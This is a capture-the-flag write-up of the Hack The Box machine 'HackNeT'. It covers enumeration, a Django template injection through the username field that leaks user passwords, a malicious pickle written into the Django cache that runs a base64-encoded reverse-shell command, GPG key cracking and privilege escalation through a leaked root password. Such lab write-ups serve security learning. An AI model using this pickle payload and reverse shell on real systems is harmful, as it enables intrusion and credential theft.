---
layout: post
title: "[HTB] HackNeT"
description: "[Machine] - Medium difficulty"
background: /img/bg-machine.jpg
tags: [htb]
difficulty: Medium
---

![](/img/htb_img/HackNeT_img/img1.png)

- OS: Linux
- Release Date: 13 Sep 2025
- Difficulty: Medium

<br>

# Enumeration
## Nmap recon
```bash
❯ sudo nmap -p- --min-rate 1200 --open -sS -Pn -n -vvv -oG allports $target
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 13:21 CEST
Initiating SYN Stealth Scan at 13:21
Scanning 10.129.xx.xx [65535 ports]
Discovered open port 80/tcp on 10.129.xx.xx
Discovered open port 22/tcp on 10.129.xx.xx
Completed SYN Stealth Scan at 13:22, 24.43s elapsed (65535 total ports)
Nmap scan report for 10.129.xx.xx
Host is up, received user-set (0.16s latency).
Scanned at 2025-09-20 13:21:38 CEST for 25s
Not shown: 62324 closed tcp ports (reset), 3209 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 24.51 seconds
           Raw packets sent: 78225 (3.442MB) | Rcvd: 68310 (2.732MB)

```

Scripts and versions.
```
❯ extractPorts allports
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.129.xx.xx
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

❯ nmap -sCV -Pn -oN targeted $target -p22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-20 13:26 CEST
Nmap scan report for 10.129.xx.xx
Host is up (0.043s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds


```

Domain obtained: `hacknet.htb`.
```
❯ echo "$target hacknet.htb" | sudo tee -a /etc/hosts
10.129.xx.xx hacknet.htb
```

## TCP 80
![](/img/htb_img/HackNeT_img/img2.png)

The website on port 80 is a social network for hackers that allows signing up and logging in.
Wappalyzer says it's using Nginx 1.22.1.

![](/img/htb_img/HackNeT_img/img3.png)

After creating an account and logging in, we are greeted with our profile page on this social network platform.
Wappalyzer says that the Web Framework is `Django`.

# Foothold

> [!NOTE] Info
> The application is a Django-style social feed with the following main endpoints:
> /profile
> /profile/edit (username is editable)
> /messages
> /contacts
> /explore
> 
> Two endpoints are particularly important:
> /search
> GET /like/<POST_ID> — toggles the like state (AJAX style)
> GET /likes/<POST_ID> — returns an HTML fragment listing all users who liked the post.
> 
> The title attribute is rendered from the username field.
> If you set your username to an SSTI payload, then like a post and visit  /likes/<POST_ID> , the injected template expression gets evaluated. As a result, the page will
> display a list of users along with their passwords.

So, we update our name with the following:
![](/img/htb_img/HackNeT_img/img4.png)
Then we like a post and curl the endpoint of that post with the corresponding ID to get a full list of users and their passwords.

We need to check the sessionid+csrftoken to make this work:
![](/img/htb_img/HackNeT_img/img5.png)

Output:
```
<img src="/media/profile.png" title="&lt;QuerySet [
{'id': 18, 'email': 'mikey@hacknet.htb', 'username': 'backdoor_bandit',
'password': 'mYd4rks1dEisH3re', ...},
...
```


> [!NOTE] Credentials
> backdoor_bandit (mikey) / mYd4rks1dEisH3re

## User flag
```
❯ ssh mikey@hacknet.htb
mikey@hacknet.htb's password: 
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 23 12:07:32 2025 from 10.10.xx.xx

mikey@hacknet:~$ cat user.txt 
<REDACTED>

mikey@hacknet:~$
```

# Lateral Movement
Mikey has no sudo privileges, so we look for the basics and check for other users.
```
mikey@hacknet:~$ sudo -l
[sudo] password for mikey: 
Sorry, user mikey may not run sudo on hacknet.
mikey@hacknet:~$ ls /home
mikey  sandy
mikey@hacknet:~$
```

We're going for `Sandy`.
The Django caching system usually stores data in the following path:
```
mikey@hacknet:~$ ls -ld /var/tmp/django_cache
drwxrwxrwx 2 sandy www-data 4096 Sep 23 10:35 /var/tmp/django_cache
mikey@hacknet:~$
```

And as we can see, it's owned by Sandy, but the group is www-data so we can try to access it from there.
We're going to perform a malicious pickle attack in Python.

## Malicious Pickle
```
import pickle  
import base64  
import os  
import time  
  
cache_dir = "/var/tmp/django_cache"  
cmd = "printf KGJhc2ggPiYgL2Rldi90Y...|base64 -d|bash"  
  
class RCE:  
    def __reduce__(self):  
        return (os.system, (cmd,),)  
  
payload = pickle.dumps(RCE())  
  
for filename in os.listdir(cache_dir):  
    if filename.endswith(".djcache"):  
        path = os.path.join(cache_dir, filename)  
        try:  
            os.remove(path) 
        except:  
            continue  
        with open(path, "wb") as f:  
            f.write(payload)  #  print(f"[+] Written payload to {filename}")
```

Execute it and we get a reverse shell on our listener.
```
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.xx.xx] from (UNKNOWN) [10.129.xx.xx] 43612
id
uid=1001(sandy) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, output log file is '/dev/null'.
sandy@hacknet:/var/www/HackNet$ export TERM=xterm
export TERM=xterm
sandy@hacknet:/var/www/HackNet$ ^Z
[1]  + 3593 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 3593 continued  nc -lvnp 4444

sandy@hacknet:/var/www/HackNet$ 
```

# Privilege Escalation
```
sandy@hacknet:/var/www/HackNet$ ls -lah
total 32K
drwxr-xr-x 7 sandy sandy    4.0K Feb 10  2025 .
drwxr-xr-x 4 root  root     4.0K Jun  2  2024 ..
drwxr-xr-x 2 sandy sandy    4.0K Dec 29  2024 backups
-rw-r--r-- 1 sandy www-data    0 Aug  8  2024 db.sqlite3
drwxr-xr-x 3 sandy sandy    4.0K Sep  8 09:20 HackNet
-rwxr-xr-x 1 sandy sandy     664 May 31  2024 manage.py
drwxr-xr-x 2 sandy sandy    4.0K Sep 23 14:20 media
drwxr-xr-x 6 sandy sandy    4.0K Sep  8 09:22 SocialNetwork
drwxr-xr-x 3 sandy sandy    4.0K May 31  2024 static
sandy@hacknet:/var/www/HackNet$ cd backups
sandy@hacknet:/var/www/HackNet/backups$ ls -lah
total 56K
drwxr-xr-x 2 sandy sandy 4.0K Dec 29  2024 .
drwxr-xr-x 7 sandy sandy 4.0K Feb 10  2025 ..
-rw-r--r-- 1 sandy sandy  14K Dec 29  2024 backup01.sql.gpg
-rw-r--r-- 1 sandy sandy  14K Dec 29  2024 backup02.sql.gpg
-rw-r--r-- 1 sandy sandy  14K Dec 29  2024 backup03.sql.gpg
sandy@hacknet:/var/www/HackNet/backups$ python3 -m http.server 8989
Serving HTTP on 0.0.0.0 port 8989 (http://0.0.0.0:8989/) ...
```

Let's download those gpg backups.
We also find some GPG keys in Sandy's home directory.
```
sandy@hacknet:/var/www/HackNet/backups$ cd /home/sandy/.gnupg/private-keys-v1.d
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls
0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
armored_key.asc
EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
sandy@hacknet:~/.gnupg/private-keys-v1.d$ python3 -m http.server 8989
Serving HTTP on 0.0.0.0 port 8989 (http://0.0.0.0:8989/) ...
```

The armored key can be cracked with John the Ripper.
```
❯ gpg2john armored_key.asc > hash.txt

File armored_key.asc
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)     
1g 0:00:00:06 DONE (2025-09-23 18:43) 0.1555g/s 66.25p/s 66.25c/s 66.25C/s 246810..popcorn
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Password: `sweetheart`.

Let's import the armored key.
```
gpg --import armored_key.asc

<sweetheart>
```

Decrypt the backup
```
gpg --output backup02.sql --decrypt backup02.sql.gpg

backup02.sql

❯ grep -i "password" backup02.sql
(26,'Brute force attacks may be noisy, but they’re still effective. I’ve been refining my techniques to make them more efficient, reducing the time it takes to crack even the most complex passwords. Writing up a guide on how to optimize your brute force attacks.','2024-08-30 14:19:57.000000',6,2,0,24);
(11,'Reducing the time to crack complex passwords is no small feat. Even though brute force is noisy, it’s still one of the most reliable methods out there. Your guide will be a must-read for anyone looking to sharpen their skills in this area!','2024-09-02 09:04:13.000000',26,7);
(47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
(48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
(50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
  `password` varchar(70) NOT NULL,
(24,'brute_force@ciphermail.com','brute_force','BrUt3F0rc3#','24.jpg','Specializes in brute force attacks and password cracking. Loves the challenge of breaking into locked systems.',0,0,1,0,0),
  `password` varchar(128) NOT NULL,
```


> [!NOTE] Credentials
> Password: h4ck3rs4re3veRywh3re99

## Root flag
```
sandy@hacknet:~/.gnupg/private-keys-v1.d$ su root
Password: 
root@hacknet:/home/sandy/.gnupg/private-keys-v1.d# id
uid=0(root) gid=0(root) groups=0(root)
root@hacknet:/home/sandy/.gnupg/private-keys-v1.d# cat /root/root.txt 
<REDACTED>
root@hacknet:/home/sandy/.gnupg/private-keys-v1.d#
```